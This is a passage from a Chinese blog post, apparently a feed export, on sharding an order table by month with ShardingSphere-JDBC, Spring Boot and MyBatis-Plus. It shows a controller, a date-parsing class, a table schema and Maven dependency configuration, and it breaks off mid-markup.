class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line"><span class="keyword">import</span> com.reiner.sharding.test.config.DateFormater;</span><br><span class="line"><span class="keyword">import</span> com.reiner.sharding.test.mapper.OrderMapper;</span><br><span class="line"><span class="keyword">import</span> com.reiner.sharding.test.model.Order;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;orders&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Logger logger =LoggerFactory.getLogger(getClass());</span><br><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">OrderMapper orderMapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">@InitBinder</span> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initBinder</span><span class="params">(WebDataBinder binder)</span></span>&#123;</span><br><span class="line"><span class="comment">//解除spring mvc list参数限制长度问题</span></span><br><span class="line">        binder.setAutoGrowCollectionLimit(<span class="number">1024</span>);</span><br><span class="line">binder.registerCustomEditor(String.class,<span class="keyword">new</span> StringTrimmerEditor(<span class="keyword">true</span>));</span><br><span class="line"><span class="comment">//必须有，将JSON日期字符串格式化成DATE日期</span></span><br><span class="line">        binder.registerCustomEditor(Date.class,</span><br><span class="line">                <span class="keyword">new</span> CustomDateEditor(<span class="keyword">new</span> DateFormater(logger), <span class="keyword">true</span>));</span><br><span class="line">binder.registerCustomEditor(<span class="keyword">long</span>.class, <span class="keyword">new</span> CustomNumberEditor(Long.class, <span class="keyword">true</span>));</span><br><span class="line">binder.registerCustomEditor(<span class="keyword">double</span>.class,<span class="keyword">new</span> CustomNumberEditor(Double.class,<span class="keyword">true</span>));</span><br><span class="line">binder.registerCustomEditor(<span class="keyword">float</span>.class, <span class="keyword">new</span> CustomNumberEditor(Float.class,<span class="keyword">true</span>));</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> 按时间分片的表查询必须带时间</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> reiner</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startTime</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> endTime</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021年12月15日</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Order&gt; <span class="title">orders</span><span class="params">(Date startTime,Date endTime)</span> </span>&#123;</span><br><span class="line">QueryWrapper&lt;Order&gt; wrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">wrapper.ge(startTime!=<span class="keyword">null</span>,<span class="string">&quot;CREATE_TIME&quot;</span>, startTime);</span><br><span class="line">wrapper.le(endTime!=<span class="keyword">null</span>,<span class="string">&quot;CREATE_TIME&quot;</span>, endTime);</span><br><span class="line">List&lt;Order&gt; list = orderMapper.selectList(wrapper);</span><br><span class="line"><span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;add&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Order o = <span class="keyword">new</span> Order();</span><br><span class="line"><span class="comment">//o.setOrderId(UUID.randomUUID().toString());</span></span><br><span class="line">o.setTitle(<span class="string">&quot;order title&quot;</span>);</span><br><span class="line">o.setUserId(<span class="number">1</span>);</span><br><span class="line">o.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line"><span class="keyword">if</span>(orderMapper.insert(o)&gt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;FAILED&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>附上控制器中时间参数转换器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.DateFormat;</span><br><span class="line"><span class="keyword">import</span> java.text.FieldPosition;</span><br><span class="line"><span class="keyword">import</span> java.text.ParsePosition;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ParseException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>:   2021-12-25</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> reiner</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 日期转换类，目前用于spring mvc接收json日期的转换</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateFormater</span> <span class="keyword">extends</span> <span class="title">DateFormat</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">Logger logger;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DateFormater</span><span class="params">(Logger logger)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.logger=logger;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DateFormater</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.logger=LoggerFactory.getLogger(getClass());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">4876634368991167714L</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> SimpleDateFormat dateTimeFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> SimpleDateFormat dateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyy-MM-dd&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> StringBuffer <span class="title">format</span><span class="params">(Date date, StringBuffer toAppendTo, FieldPosition fieldPosition)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> dateTimeFormat.format(date, toAppendTo, fieldPosition);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Date <span class="title">parse</span><span class="params">(String source, ParsePosition pos)</span> </span>&#123;</span><br><span class="line">Date date = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(!StringUtils.isEmpty(source)) &#123;</span><br><span class="line"><span class="keyword">if</span>(source.indexOf(<span class="string">&quot;:&quot;</span>)!=-<span class="number">1</span>) &#123;</span><br><span class="line">date = dateTimeFormat.parse(source,pos);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">date = dateFormat.parse(source, pos);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">logger.error(<span class="string">&quot;日期转换异常，异常参考信息：&#123;&#125;,&#123;&#125;&quot;</span>,e.getMessage(),source);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Date <span class="title">parse</span><span class="params">(String source)</span> <span class="keyword">throws</span> ParseException, java.text.ParseException </span>&#123;</span><br><span class="line">Date date = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(!StringUtils.isEmpty(source)) &#123;</span><br><span class="line"><span class="keyword">if</span>(source.indexOf(<span class="string">&quot;:&quot;</span>)!=-<span class="number">1</span>) &#123;</span><br><span class="line">date = dateTimeFormat.parse(source);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">date = dateFormat.parse(source);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">logger.error(<span class="string">&quot;日期转换异常，异常参考信息：&#123;&#125;,&#123;&#125;&quot;</span>,e.getMessage(),source);</span><br><span class="line">date = dateFormat.parse(source);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> DateFormater(logger);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<a href="http://localhost:7999/orders?startTime=2021-11-01&amp;endTime=2021-11-30">http://localhost:7999/orders?startTime=2021-11-01&amp;endTime=2021-11-30</a> ,shardingjdbc会自动根据参数变换表名，如startTime=2021-11-01，则查询的表名为：t_order_2021-11。</p><p>插入同理，会根据createTime字段自动选择要插入的表，同时查多个月份的数据shardingjdbc会自动查询多张表。</p><p>测试用的表结构：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`db0`</span>.<span class="string">`Untitled`</span>  (</span><br><span class="line">  <span class="string">`order_id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`user_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`title`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`create_time`</span> datetime <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`order_id`</span>) <span class="keyword">USING</span> BTREE</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4 <span class="keyword">COLLATE</span> = utf8mb4_general_ci ROW_FORMAT = Dynamic;</span><br></pre></td></tr></table></figure><h2><span id="每月创建表">每月创建表</span></h2><p>这一步不能忘，shardingjdbc不会自动创建表，因此需要我们自己写一个定时任务自动按月或者年创建表，如按月则获取当前时间并取名：t_order_2021_12</p><p>下一篇将记录一下如何使用shardingjdbc分表分库。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;使用场景&quot;&gt;&lt;a href=&quot;#使用场景&quot; class=&quot;headerlink&quot; title=&quot;使用场景&quot;&gt;&lt;/a&gt;使用场景&lt;/h1&gt;&lt;p&gt;适用于单库，日志表过大的问题，如每月产生几千万条日志，还不能清理，必须存档，其它业务表反而没这么大量时，可以使用分表来解决。&lt;/p&gt;
&lt;p&gt;可以按实际情况来决定是按年分表还是按月分表，每年产生的数据量过亿时可以按月分表。&lt;/p&gt;
&lt;h2 id=&quot;本文使用的框架&quot;&gt;&lt;a href=&quot;#本文使用的框架&quot; class=&quot;headerlink&quot; title=&quot;本文使用的框架&quot;&gt;&lt;/a&gt;本文使用的框架&lt;/h2&gt;&lt;p&gt;使用spring boot 2.x + mybatis-plus + shardingjdbc5.x + druid &lt;/p&gt;
&lt;p&gt;shardingjdbc非常坑的一个点，每个版本变一次配置，官方文档写得不清不楚，通过GITHUB找到官方示例，发现示例也很少，最后是通过网上的博文+示例+文档才搞定。&lt;/p&gt;
&lt;h2 id=&quot;配置maven依赖&quot;&gt;&lt;a href=&quot;#配置maven依赖&quot; class=&quot;headerlink&quot; title=&quot;配置maven依赖&quot;&gt;&lt;/a&gt;配置maven依赖&lt;/h2&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;properties&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;sharding-sphere.version&lt;/span&gt;&amp;gt;&lt;/span&gt;5.0.0&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;sharding-sphere.version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;mybatis-plus.version&lt;/span&gt;&amp;gt;&lt;/span&gt;3.4.2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;mybatis-plus.version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;properties&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;parent&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;spring-boot-starter-parent&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;2.3.4.RELEASE&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;parent&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependencies&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- 不能用druid-springboot-starter 会无法启动 --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.alibaba&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;druid&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.2.8&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid-spring-boot-starter --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- &amp;lt;dependency&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;		    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;		    &amp;lt;artifactId&amp;gt;druid-spring-boot-starter&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;		    &amp;lt;version&amp;gt;1.1.22&amp;lt;/version&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;		&amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework.boot&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span 